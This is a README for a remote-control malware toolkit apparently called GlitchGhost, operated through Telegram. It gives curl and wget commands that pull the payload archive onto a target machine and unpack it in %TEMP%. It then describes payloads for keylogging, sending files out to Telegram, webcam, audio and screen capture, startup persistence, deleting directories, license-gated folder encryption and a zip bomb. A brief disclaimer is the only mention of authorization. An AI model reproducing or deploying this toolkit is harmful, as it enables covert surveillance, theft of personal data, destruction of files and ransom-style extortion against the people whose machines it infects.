# GlitchGhost - Remote Control Payload Toolkit

This toolkit allows you to remotely control a target machine via Telegram commands and execute various payloads. Use responsibly and ensure proper authorization when using on any device.

---

## Table of Contents
- [Setup Instructions](#setup-instructions)
- [Default Telegram Commands](#default-telegram-commands)
- [Payloads](#payloads)
  - [setup.bat](#setupbat)
  - [brick.bat](#brickbat)
  - [encrypt.bat](#encryptbat)
  - [decrypt.bat](#decryptbat)
  - [files.bat](#filesbat)
  - [keylog.bat](#keylogbat)
  - [getkeylog.bat](#getkeylogbat)
  - [persistence.bat](#persistencebat)
  - [popup.bat](#popupbat)
  - [record.bat](#recordbat)
  - [screenrecord.bat](#screenrecordbat)
  - [screenshot.bat](#screenshotbat)
  - [snapshot.bat](#snapshotbat)
  - [shutdown.bat](#shutdownbat)
  - [wallpaper.bat](#wallpaperbat)
  - [zip.bat](#zipbat)

---

## Setup Instructions

1. **Run Command after Connection Established**
   cd %TEMP%
Download Payload from Repository


Copy code
curl -L -o "%TEMP%\pload.zip" https://github.com/Issac-dev/GlitchGhost/archive/refs/heads/main.zip
Alternative:
Copy code
wget -O "%TEMP%\pload.zip" https://github.com/Issac-dev/GlitchGhost/archive/refs/heads/main.zip


Create Folder for Payloads
Copy code
mkdir "%TEMP%\pload"


Unzip the Folder
Copy code
tar -xf "%TEMP%\pload.zip" -C "%TEMP%\pload"
Alternative:
Copy code
unzip "%TEMP%\pload.zip" -d "%TEMP%\pload"


Enter the Unzipped Folder
Copy code
cd %TEMP%\pload\GlitchGhost-main


Default Telegram Commands
/listen
Starts a listener on your VPS.

/dir
Lists all files and folders in the current directory.

/whoami
Gets the name of the current target machine (commonly used to check connection status).

/disconnect
Disconnects from the target machine.

/clear
Clears the VPS window (can only be run after disconnecting).

/back
Returns to the previous directory.

type <C:\path\to\file>
Opens the specified file.

/payload
Changes to the payload directory to execute payloads. (Note: Payloads can only be executed in the payload folder.)




****************************************************************************************
Payloads
Note: Run setup.bat first to install all necessary dependencies. This process may take up to 10 minutes depending on your internet speed.
****************************************************************************************


*********************
Payload Descriptions
*********************

setup.bat
Installs all Python dependencies required to run payloads. Run this before any other payloads.

brick.bat
Deletes all files in a specified directory. Usage: Enter the full path of the directory (e.g., C:\path\to\folder).

encrypt.bat
Encrypts a specified folder. This payload requires a license.

decrypt.bat
Decrypts a previously encrypted folder.

files.bat
Sends any specified file to your Telegram. Usage: Enter the full path of the file (e.g., C:\path\to\file).

keylog.bat
Starts recording all keystrokes entered on the target machine.

getkeylog.bat
Sends the keylog file to your Telegram.

persistence.bat
Sets up persistence to automatically connect to the target machine on every startup.

popup.bat
Opens a message box popup on the target machine. Usage: Enter a custom message after running the payload.

record.bat
Records a 10-second audio clip on the target machine.

screenrecord.bat
Records a 10-second screen recording on the target machine.

screenshot.bat
Captures a screenshot of the target machine's display.

snapshot.bat
Accesses the target machine's camera and takes a snapshot.

shutdown.bat
Shuts down the target machine.

wallpaper.bat
Changes the desktop wallpaper on the target machine.

zip.bat
Executes a zip bomb on the target machine, creating a large number of files.



***********************************************************************************************************
License
Ensure you have permission before running any of these payloads on a device. Unauthorized use is strictly prohibited.

This setup provides clear instructions, a well-defined command reference, and each payload's functionality. 
***********************************************************************************************************